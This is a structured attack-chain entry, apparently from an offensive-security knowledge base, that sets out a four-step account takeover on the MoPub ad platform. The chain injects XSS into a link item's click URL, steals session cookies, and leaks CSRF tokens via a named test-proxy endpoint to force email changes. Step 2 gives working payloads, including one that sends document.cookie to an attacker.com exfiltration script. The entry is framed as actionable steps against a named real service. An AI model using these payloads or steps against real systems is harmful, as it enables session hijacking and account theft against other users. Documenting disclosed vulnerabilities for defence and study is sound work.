---
id: ac-mopub-xss-session-hijack-001
tags:
  - xss
  - csrf
  - session-hijacking
  - account-takeover
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-Link-Item-in-MoPub]]'
  - '[[procedures/Inject-XSS-Payload-into-Click-URL]]'
  - '[[procedures/Associate-Line-Item-and-Trigger-XSS-via-Ad-Test]]'
  - '[[procedures/Exploit-XSS-for-Session-Hijacking-and-CSRF-Leak]]'
step_count: 4
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:37.941Z'
description: >-
  A multi-stage attack exploiting XSS in MoPub's link item click URL to execute
  JavaScript, steal session cookies, hijack sessions in shared inventories, and
  leak CSRF tokens for account takeover via email changes.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# MoPub XSS in Link Items Click URL Leading to Session Hijacking and Account Takeover

Multi-stage attack chain demonstrating exploitation of a reflected XSS vulnerability in the MoPub advertising platform's link item click URL field. The attack allows arbitrary JavaScript execution during ad testing or previewing, enabling session cookie theft for hijacking admin sessions in shared inventories. It chains with a CSRF token leakage via the adserver_test_proxy endpoint to facilitate account takeover through unauthorized email changes.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Link Item] --> B[Inject XSS Payload]
    B --> C[Associate and Test Ad]
    C --> D[Hijack Session and Leak CSRF]
    D --> E[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Firefox or Chrome with developer tools)
- Burp Suite or similar proxy for inspecting requests (optional but recommended)

### Target Environment

- MoPub platform at https://app.mopub.com
- Authenticated access as an advertiser or admin with permissions to create/edit line items and ad units
- Shared inventory access for targeting multiple users

### Initial Access Requirements

- Valid MoPub account credentials
- Network access to app.mopub.com (no special ports required beyond standard HTTPS/443)
- Prior knowledge of ad unit IDs for association

## Detailed Attack Procedures

### Step 1: Create Malicious Link Item in MoPub
procedure: [[procedures/Create-Malicious-Link-Item-in-MoPub]]

**Objective**: Set up a link item that can host a malicious click URL to prepare for XSS injection.

**Instructions**: Log in to the MoPub dashboard and navigate to the line items section to create a new link item of text or tile type. This establishes the base for payload injection.

**Expected Output**: A new line item created and visible in the dashboard for further editing.

**Success Indicators**:
- Line item successfully saved without errors
- Item listed under /advertise/line_items/

### Step 2: Inject XSS Payload into Click URL
procedure: [[procedures/Inject-XSS-Payload-into-Click-URL]]

**Objective**: Introduce a JavaScript payload into the click URL field to enable arbitrary code execution upon triggering.

**Instructions**: Edit the line item and set the click URL to a javascript: payload, such as `javascript://%0a%0dalert(document.cookie)` for testing or `javascript://%0d%0a"><script>document.location="https://attacker.com/exfil.php#"+document.cookie</script>` for exfiltration. Save the changes.

**Expected Output**: Payload accepted and saved in the click URL field without sanitization errors.

**Success Indicators**:
- No validation errors on save
- Payload visible in the edit form upon reload

### Step 3: Associate Line Item and Trigger XSS via Ad Test
procedure: [[procedures/Associate-Line-Item-and-Trigger-XSS-via-Ad-Test]]

**Objective**: Link the malicious item to an ad unit and invoke the test feature to execute the XSS payload in the browser context.

**Instructions**: Attach the line item to an existing ad unit under the inventory section, then select the ad unit and click the 'test ad' button. This renders the ad preview and triggers the javascript: URL.

**Expected Output**: Alert box or exfiltration request fired in the browser console.

**Success Indicators**:
- JavaScript execution confirmed (e.g., alert pops or network request to attacker domain)
- Session cookies captured if exfiltration payload used

### Step 4: Exploit XSS for Session Hijacking and CSRF Leak
procedure: [[procedures/Exploit-XSS-for-Session-Hijacking-and-CSRF-Leak]]

**Objective**: Use the executed payload to steal cookies for session hijacking and leverage the proxy endpoint to leak CSRF tokens for further attacks like email changes.

**Instructions**: With stolen cookies, replay the session in a new browser to access shared inventories. For CSRF, invoke the adserver_test_proxy endpoint (e.g., https://app.mopub.com/advertise/adserver_test_proxy/?debug_mode=1&id=AD_UNIT_ID) during testing to expose tokens, then use [[commands/csrf-account-settings-change]] to submit a forged POST request changing the email.

**Expected Output**: Session access granted or account settings updated successfully.

**Success Indicators**:
- Attacker gains admin-level access via hijacked session
- CSRF token leaked and used for account modification

## Attack Chain Summary

### Key Achievements

1. Arbitrary JavaScript execution via unsanitized click URL in ad testing
2. Session cookie theft enabling hijacking of shared inventory access
3. CSRF token leakage through adserver_test_proxy for bypassing protections
4. Full account takeover via unauthorized email changes

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
